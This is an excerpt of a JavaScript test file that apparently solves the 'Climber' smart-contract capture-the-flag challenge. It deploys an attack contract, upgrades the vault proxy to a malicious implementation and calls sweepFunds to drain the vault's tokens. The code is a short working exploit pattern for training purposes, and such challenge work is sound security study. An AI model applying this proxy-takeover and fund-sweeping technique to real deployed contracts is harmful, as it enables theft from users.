...
describe("[Challenge] Climber", function () {
  ...
  it("Exploit", async function () {
    ...
    this.climberUpgradeAttack = await ethers.getContractFactory(
      "ClimberUpgradeAttack",
      attacker
    );

    let tx = await this.attackContract.connect(attacker).attack();
    await tx.wait(1);

    // Change Logic contract attached to the Proxy
    const newProxy = await upgrades.upgradeProxy(
      this.vault.address,
      this.climberUpgradeAttack
    );
    await newProxy.connect(attacker).sweepFunds(this.token.address);
  });
